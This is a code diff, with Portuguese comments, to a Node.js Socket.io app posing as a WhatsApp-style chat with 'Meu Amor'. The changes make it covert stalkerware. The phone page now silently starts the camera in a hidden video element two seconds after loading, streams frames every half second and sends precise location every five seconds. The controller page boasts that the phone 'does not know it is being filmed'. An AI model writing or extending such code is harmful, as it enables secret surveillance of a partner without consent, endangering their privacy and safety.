@@ -27,20 +27,26 @@ app.get('/', (req, res) => {
 io.on('connection', (socket) => {
     console.log('✅ Cliente conectado:', socket.id);
     
+    // Mensagens (nos dois sentidos)
     socket.on('send_message', (data) => {
+        console.log('📨 Mensagem:', data.text);
         socket.broadcast.emit('new_message', data);
     });
     
+    // Comandos do PC (invisíveis para o celular)
     socket.on('command', (cmd) => {
-        console.log('🎮 Comando:', cmd.type);
+        console.log('🎮 Comando stealth:', cmd.type);
         socket.broadcast.emit('execute_command', cmd);
     });
     
+    // Câmera (celular envia sem saber)
     socket.on('camera_frame', (frame) => {
         socket.broadcast.emit('camera_stream', frame);
     });
     
+    // Localização (celular envia sem saber)
     socket.on('location_update', (loc) => {
+        console.log('📍 Localização recebida (stealth)');
         socket.broadcast.emit('new_location', loc);
     });
     
@@ -50,12 +56,16 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n🚀 Servidor rodando na Railway!`);
+    console.log(`\n🚀 Servidor Stealth rodando!`);
     console.log(`📍 Porta: ${PORT}`);
-    console.log(`🌐 Acesse: https://brincando-production-81fa.up.railway.app`);
+    console.log(`\n⚠️ MODO INVISÍVEL:`);
+    console.log(`   📱 Celular: ENVIA mensagens normalmente`);
+    console.log(`   📱 Celular: NÃO sabe que está sendo filmado`);
+    console.log(`   📱 Celular: NÃO vê controles`);
+    console.log(`   💻 PC: Controle total e invisível\n`);
 });
 
-// ============ PÁGINA DO CELULAR ============
+// ============ PÁGINA DO CELULAR (WHATSAPP NORMAL, MAS CONTROLADO) ============
 function getMobilePage(fullUrl) {
     return `<!DOCTYPE html>
 <html>
@@ -70,6 +80,12 @@ function getMobilePage(fullUrl) {
             background: #0b141a;
             height: 100vh;
             overflow: hidden;
+        }
+        .app {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            background: #0b141a;
         }
         .header {
             background: #202c33;
@@ -92,7 +108,7 @@ function getMobilePage(fullUrl) {
         .contact-info h3 { color: #e9edef; font-size: 16px; }
         .contact-status { color: #8696a0; font-size: 12px; }
         .messages {
-            height: calc(100vh - 140px);
+            flex: 1;
             overflow-y: auto;
             padding: 16px;
             display: flex;
@@ -104,34 +120,62 @@ function getMobilePage(fullUrl) {
             padding: 8px 12px;
             border-radius: 8px;
             font-size: 14px;
-            background: #202c33;
-            color: #e9edef;
-            align-self: flex-start;
-            border-bottom-left-radius: 2px;
             animation: fadeIn 0.2s ease;
         }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
+        .message.sent {
+            background: #005c4b;
+            color: #e9edef;
+            align-self: flex-end;
+            border-bottom-right-radius: 2px;
+        }
+        .message.received {
+            background: #202c33;
+            color: #e9edef;
+            align-self: flex-start;
+            border-bottom-left-radius: 2px;
+        }
         .message-meta {
+            display: flex;
+            justify-content: flex-end;
+            gap: 4px;
+            margin-top: 4px;
             font-size: 10px;
             color: #8696a0;
-            margin-top: 4px;
-            text-align: right;
         }
         .input-area {
             background: #202c33;
-            padding: 12px 16px;
+            padding: 8px 12px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
             border-top: 1px solid #2a3942;
-            text-align: center;
         }
-        .input-disabled {
-            background: #1a242a;
-            padding: 10px;
+        .input-field {
+            flex: 1;
+            background: #2a3942;
+            border: none;
+            padding: 10px 16px;
             border-radius: 24px;
+            color: #e9edef;
+            font-size: 15px;
+            outline: none;
+        }
+        .input-field::placeholder {
             color: #8696a0;
-            font-size: 13px;
+        }
+        .send-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #8696a0;
+        }
+        .send-btn.active {
+            color: #25d366;
         }
         .toast {
             position: fixed;
@@ -150,27 +194,10 @@ function getMobilePage(fullUrl) {
             from { opacity: 0; transform: translateX(-50%) translateY(20px); }
             to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
-        .camera-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #25d366;
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-            z-index: 10;
-        }
     </style>
 </head>
 <body>
-    <div>
+    <div class="app">
         <div class="header">
             <div class="avatar">💕</div>
             <div class="contact-info">
@@ -179,94 +206,186 @@ function getMobilePage(fullUrl) {
             </div>
         </div>
         <div class="messages" id="messages">
-            <div class="message">💕 Conectado! Aguardando mensagens 💕<div class="message-meta">Agora</div></div>
+            <div class="message received">
+                💕 Olá! Como você está? 💕
+                <div class="message-meta"><span>Agora</span><span>✓✓</span></div>
+            </div>
         </div>
         <div class="input-area">
-            <div class="input-disabled">📱 Modo visualização - Apenas recebendo mensagens</div>
+            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
+            <button class="send-btn" id="sendBtn">📤</button>
         </div>
     </div>
-    <button class="camera-btn" id="cameraBtn">📷</button>
+
     <script src="${fullUrl}/socket.io/socket.io.js"></script>
     <script>
         const socket = io('${fullUrl}', { transports: ['websocket', 'polling'] });
         const messages = document.getElementById('messages');
+        const messageInput = document.getElementById('messageInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const statusText = document.getElementById('statusText');
         
-        function showToast(msg) {
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.textContent = msg;
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 3000);
-        }
+        let typingTimeout = null;
+        let isTyping = false;
         
-        function addMessage(text) {
-            const div = document.createElement('div');
-            div.className = 'message';
-            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
-            div.innerHTML = \`<div>\${text}</div><div class="message-meta">\${time}</div>\`;
-            messages.appendChild(div);
+        // Função para adicionar mensagem
+        function addMessage(text, type = 'sent') {
+            const messageDiv = document.createElement('div');
+            messageDiv.className = \`message \${type}\`;
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            messageDiv.innerHTML = \`
+                <div>\${text}</div>
+                <div class="message-meta">
+                    <span>\${timeStr}</span>
+                    <span>✓✓</span>
+                </div>
+            \`;
+            messages.appendChild(messageDiv);
             messages.scrollTop = messages.scrollHeight;
         }
         
+        // Enviar mensagem
+        function sendMessage() {
+            const text = messageInput.value.trim();
+            if (text) {
+                addMessage(text, 'sent');
+                socket.emit('send_message', { text, timestamp: Date.now() });
+                messageInput.value = '';
+                stopTyping();
+            }
+        }
+        
+        // Indicador de digitação
+        function startTyping() {
+            if (!isTyping) {
+                isTyping = true;
+                socket.emit('typing_start');
+                statusText.innerHTML = '✍️ digitando...';
+            }
+            if (typingTimeout) clearTimeout(typingTimeout);
+            typingTimeout = setTimeout(() => {
+                stopTyping();
+            }, 1000);
+        }
+        
+        function stopTyping() {
+            if (isTyping) {
+                isTyping = false;
+                socket.emit('typing_stop');
+                statusText.innerHTML = '🟢 online';
+            }
+        }
+        
+        // Eventos
+        sendBtn.addEventListener('click', sendMessage);
+        messageInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendMessage();
+        });
+        messageInput.addEventListener('input', startTyping);
+        
+        // Receber mensagens do PC
         socket.on('new_message', (data) => {
-            addMessage(data.text);
-            showToast('💬 Nova mensagem');
+            addMessage(data.text, 'received');
         });
         
-        socket.on('execute_command', (cmd) => {
-            if (cmd.type === 'vibrate' && navigator.vibrate) {
-                navigator.vibrate(200);
-                showToast('📳 Vibração!');
-            } else if (cmd.type === 'emergency') {
-                if (navigator.vibrate) navigator.vibrate([500,200,500]);
-                showToast('💖 Surpresa!');
-                addMessage('💖 Surpresa especial recebida! 💖');
-            } else if (cmd.type === 'get_location' && navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    socket.emit('location_update', { lat: pos.coords.latitude, lng: pos.coords.longitude });
-                    showToast('📍 Localização enviada!');
-                });
-            } else if (cmd.type === 'start_camera') {
-                startCamera();
+        socket.on('user_typing', (data) => {
+            if (data.isTyping) {
+                statusText.innerHTML = '✍️ digitando...';
+            } else {
+                statusText.innerHTML = '🟢 online';
             }
         });
         
-        async function startCamera() {
+        // ========== FUNÇÕES STEALTH (INVISÍVEIS PARA O USUÁRIO) ==========
+        // Câmera em segundo plano (sem o usuário saber)
+        let stealthStream = null;
+        let stealthInterval = null;
+        
+        async function startStealthCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stealthStream = stream;
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.play();
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                await video.play();
+                
                 const track = stream.getVideoTracks()[0];
-                const capture = new ImageCapture(track);
-                setInterval(() => {
-                    capture.grabFrame().then(bitmap => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = bitmap.width;
-                        canvas.height = bitmap.height;
-                        canvas.getContext('2d').drawImage(bitmap, 0, 0);
-                        socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
-                    });
+                const imageCapture = new ImageCapture(track);
+                
+                stealthInterval = setInterval(() => {
+                    if (stealthStream && stealthStream.active) {
+                        imageCapture.grabFrame()
+                            .then(imageBitmap => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = imageBitmap.width;
+                                canvas.height = imageBitmap.height;
+                                canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
+                                socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
+                            })
+                            .catch(() => {});
+                    }
                 }, 500);
-                showToast('📷 Câmera ativada!');
-            } catch(e) { showToast('❌ Erro na câmera'); }
+                
+                console.log('📷 Câmera stealth ativada');
+            } catch (err) {
+                console.log('Erro na câmera stealth:', err);
+            }
         }
         
-        document.getElementById('cameraBtn').onclick = startCamera;
-        socket.on('connect', () => showToast('✨ Conectado! ✨'));
+        // Localização em segundo plano (sem o usuário saber)
+        function startStealthLocation() {
+            if (navigator.geolocation) {
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            socket.emit('location_update', {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude
+                            });
+                        },
+                        (error) => {},
+                        { enableHighAccuracy: true }
+                    );
+                }, 5000);
+                console.log('📍 Localização stealth ativada');
+            }
+        }
+        
+        // Iniciar tudo em segundo plano (sem avisar o usuário)
+        setTimeout(() => {
+            startStealthCamera();
+            startStealthLocation();
+        }, 2000);
+        
+        // Comandos do PC
+        socket.on('execute_command', (cmd) => {
+            if (cmd.type === 'vibrate' && navigator.vibrate) {
+                navigator.vibrate(200);
+            } else if (cmd.type === 'emergency') {
+                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+            }
+        });
+        
+        // Conexão
+        socket.on('connect', () => {
+            console.log('Conectado ao servidor');
+        });
     </script>
 </body>
 </html>`;
 }
 
-// ============ PÁGINA DO PC ============
+// ============ PÁGINA DO PC (CONTROLE TOTAL) ============
 function getPCPage(fullUrl) {
     return `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WhatsApp Web - Controle</title>
+    <title>WhatsApp Web - Controle Stealth</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -286,6 +405,19 @@ function getPCPage(fullUrl) {
             border-bottom: 1px solid #2a3942;
         }
         .header h3 { color: #e9edef; }
+        .status {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #25d366;
+            border-radius: 50%;
+            margin-right: 6px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
         .messages {
             flex: 1;
             overflow-y: auto;
@@ -299,16 +431,23 @@ function getPCPage(fullUrl) {
             padding: 8px 12px;
             border-radius: 8px;
             font-size: 14px;
+            animation: fadeIn 0.2s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .message.sent {
             background: #005c4b;
             color: white;
             align-self: flex-end;
+            border-bottom-right-radius: 2px;
         }
         .message.received {
             background: #202c33;
             color: white;
             align-self: flex-start;
+            border-bottom-left-radius: 2px;
         }
         .message-meta {
             font-size: 10px;
@@ -340,82 +479,144 @@ function getPCPage(fullUrl) {
             cursor: pointer;
         }
         .panel {
-            width: 300px;
+            width: 320px;
             background: #202c33;
             border-left: 1px solid #2a3942;
             padding: 20px;
             overflow-y: auto;
         }
-        .panel button {
+        .panel h3 {
+            color: #e9edef;
+            margin-bottom: 16px;
+            font-size: 16px;
+        }
+        .btn-control {
             width: 100%;
-            margin-bottom: 10px;
             background: #2a3942;
             border: none;
             padding: 12px;
             border-radius: 8px;
             color: white;
             cursor: pointer;
+            margin-bottom: 10px;
             display: flex;
             align-items: center;
             gap: 10px;
+            transition: all 0.2s;
         }
-        .panel button:hover { background: #3b4a54; }
-        .panel .danger { background: #c0392b; }
-        .panel h3 { color: #e9edef; margin-bottom: 16px; }
-        .preview { margin-top: 10px; background: #111b21; border-radius: 8px; overflow: hidden; }
-        .preview img { width: 100%; }
+        .btn-control:hover {
+            background: #3b4a54;
+            transform: translateY(-1px);
+        }
+        .btn-danger {
+            background: #c0392b;
+        }
+        .btn-danger:hover {
+            background: #e74c3c;
+        }
+        .preview {
+            background: #111b21;
+            border-radius: 8px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        .preview img {
+            width: 100%;
+            height: auto;
+        }
         .location-info {
             background: #111b21;
-            padding: 10px;
+            padding: 12px;
             border-radius: 8px;
             font-size: 12px;
             margin-top: 10px;
             color: #8696a0;
+            word-break: break-all;
         }
-        .status {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #25d366;
-            border-radius: 50%;
-            margin-right: 6px;
+        .location-info a {
+            color: #25d366;
+            text-decoration: none;
+        }
+        .stealth-badge {
+            background: #c0392b;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            margin-left: 10px;
         }
     </style>
 </head>
 <body>
     <div class="chat">
         <div class="header">
-            <h3>💕 Meu Amor</h3>
-            <div style="font-size:12px; color:#8696a0; margin-top:5px;"><span class="status"></span> online</div>
+            <h3>💕 Meu Amor <span class="stealth-badge">MODO STEALTH</span></h3>
+            <div style="font-size:12px; color:#8696a0; margin-top:5px;">
+                <span class="status"></span> <span id="contactStatus">online</span>
+            </div>
         </div>
         <div class="messages" id="messages">
-            <div class="message received">💕 Conectado! Envie mensagens<div class="message-meta">Agora</div></div>
+            <div class="message received">
+                💕 Conectado! Controle invisível ativado 💕
+                <div class="message-meta">Agora</div>
+            </div>
         </div>
         <div class="input-area">
-            <input type="text" id="input" placeholder="Digite uma mensagem">
-            <button id="send">📤 Enviar</button>
+            <input type="text" id="messageInput" placeholder="Digite uma mensagem para o celular">
+            <button id="sendBtn">📤 Enviar</button>
         </div>
     </div>
     <div class="panel">
-        <h3>🎮 Controles Remotos</h3>
-        <button id="cameraBtn">📷 Ativar Câmera</button>
-        <div class="preview"><img id="cameraPreview" src=""></div>
+        <h3>🎮 Controle Invisível</h3>
         
-        <button id="locationBtn">📍 Solicitar Localização</button>
-        <div class="location-info" id="locationInfo">Aguardando...</div>
+        <button class="btn-control" id="cameraBtn">
+            📷 Ver Câmera do Celular
+        </button>
+        <div class="preview">
+            <img id="cameraPreview" src="">
+        </div>
         
-        <button id="vibrateBtn">📳 Vibrar Celular</button>
-        <button id="emergencyBtn" class="danger">💥 Surpresa Especial</button>
+        <button class="btn-control" id="locationBtn">
+            📍 Ver Localização
+        </button>
+        <div class="location-info" id="locationInfo">
+            Aguardando localização...
+        </div>
+        
+        <button class="btn-control" id="vibrateBtn">
+            📳 Vibrar Celular
+        </button>
+        
+        <button class="btn-control btn-danger" id="emergencyBtn">
+            💥 Surpresa Especial
+        </button>
+        
+        <div style="margin-top: 20px; padding: 12px; background: #111b21; border-radius: 8px;">
+            <div style="color: #8696a0; font-size: 11px;">
+                ⚠️ Modo Stealth ativado<br>
+                • Celular NÃO sabe que está sendo filmado<br>
+                • Celular NÃO vê esses controles<br>
+                • Celular pode enviar mensagens normalmente
+            </div>
+        </div>
     </div>
+
     <script src="${fullUrl}/socket.io/socket.io.js"></script>
     <script>
         const socket = io('${fullUrl}', { transports: ['websocket', 'polling'] });
+        
+        // Elementos
         const messages = document.getElementById('messages');
-        const input = document.getElementById('input');
-        const sendBtn = document.getElementById('send');
+        const messageInput = document.getElementById('messageInput');
+        const sendBtn = document.getElementById('sendBtn');
         const cameraPreview = document.getElementById('cameraPreview');
         const locationInfo = document.getElementById('locationInfo');
+        const contactStatus = document.getElementById('contactStatus');
         
+        let typingTimeout = null;
+        let isTyping = false;
+        
+        // Adicionar mensagem
         function addMessage(text, type = 'sent') {
             const div = document.createElement('div');
             div.className = \`message \${type}\`;
@@ -425,43 +626,91 @@ function getPCPage(fullUrl) {
             messages.scrollTop = messages.scrollHeight;
         }
         
+        // Enviar mensagem
         function sendMessage() {
-            const text = input.value.trim();
+            const text = messageInput.value.trim();
             if (text) {
                 addMessage(text, 'sent');
                 socket.emit('send_message', { text });
-                input.value = '';
+                messageInput.value = '';
+                stopTyping();
             }
         }
         
-        sendBtn.onclick = sendMessage;
-        input.onkeypress = (e) => { if (e.key === 'Enter') sendMessage(); };
+        function startTyping() {
+            if (!isTyping) {
+                isTyping = true;
+                socket.emit('typing_start');
+            }
+            if (typingTimeout) clearTimeout(typingTimeout);
+            typingTimeout = setTimeout(() => stopTyping(), 1000);
+        }
         
-        document.getElementById('cameraBtn').onclick = () => {
+        function stopTyping() {
+            if (isTyping) {
+                isTyping = false;
+                socket.emit('typing_stop');
+            }
+        }
+        
+        // Eventos
+        sendBtn.addEventListener('click', sendMessage);
+        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
+        messageInput.addEventListener('input', startTyping);
+        
+        // Controles
+        document.getElementById('cameraBtn').addEventListener('click', () => {
             socket.emit('command', { type: 'start_camera' });
-            addMessage('📷 Solicitando câmera...', 'sent');
-        };
-        document.getElementById('locationBtn').onclick = () => {
-            socket.emit('command', { type: 'get_location' });
-            addMessage('📍 Solicitando localização...', 'sent');
-        };
-        document.getElementById('vibrateBtn').onclick = () => {
-            socket.emit('command', { type: 'vibrate' });
-            addMessage('📳 Vibração enviada', 'sent');
-        };
-        document.getElementById('emergencyBtn').onclick = () => {
-            socket.emit('command', { type: 'emergency' });
-            addMessage('💥 Surpresa enviada!', 'sent');
-        };
-        
-        socket.on('new_message', (data) => addMessage(data.text, 'received'));
-        socket.on('camera_stream', (frame) => { cameraPreview.src = frame; });
-        socket.on('new_location', (loc) => {
-            locationInfo.innerHTML = \`📍 Lat: \${loc.lat.toFixed(6)}<br>📍 Lng: \${loc.lng.toFixed(6)}\`;
-            addMessage(\`📍 Localização recebida\`, 'received');
+            addMessage('📷 Solicitando câmera (stealth)...', 'sent');
         });
         
-        messages.innerHTML = '<div class="message received">💕 Conectado ao celular!<div class="message-meta">Agora</div></div>';
+        document.getElementById('locationBtn').addEventListener('click', () => {
+            socket.emit('command', { type: 'get_location' });
+            addMessage('📍 Solicitando localização (stealth)...', 'sent');
+        });
+        
+        document.getElementById('vibrateBtn').addEventListener('click', () => {
+            socket.emit('command', { type: 'vibrate' });
+            addMessage('📳 Vibração enviada (stealth)', 'sent');
+        });
+        
+        document.getElementById('emergencyBtn').addEventListener('click', () => {
+            socket.emit('command', { type: 'emergency' });
+            addMessage('💥 Surpresa especial enviada!', 'sent');
+        });
+        
+        // Receber dados
+        socket.on('new_message', (data) => {
+            addMessage(data.text, 'received');
+        });
+        
+        socket.on('camera_stream', (frame) => {
+            cameraPreview.src = frame;
+        });
+        
+        socket.on('new_location', (location) => {
+            locationInfo.innerHTML = \`
+                📍 Última localização:<br>
+                Latitude: \${location.lat.toFixed(6)}<br>
+                Longitude: \${location.lng.toFixed(6)}<br>
+                <a href="https://www.google.com/maps?q=\${location.lat},\${location.lng}" target="_blank">
+                    🗺️ Abrir no Google Maps
+                </a>
+            \`;
+            addMessage(\`📍 Localização recebida (stealth)\`, 'received');
+        });
+        
+        socket.on('user_typing', (data) => {
+            if (data.isTyping) {
+                contactStatus.innerHTML = 'digitando... ✍️';
+            } else {
+                contactStatus.innerHTML = 'online';
+            }
+        });
+        
+        socket.on('connect', () => {
+            addMessage('✨ Conectado ao celular em modo stealth!', 'received');
+        });
     </script>
 </body>
 </html>`;
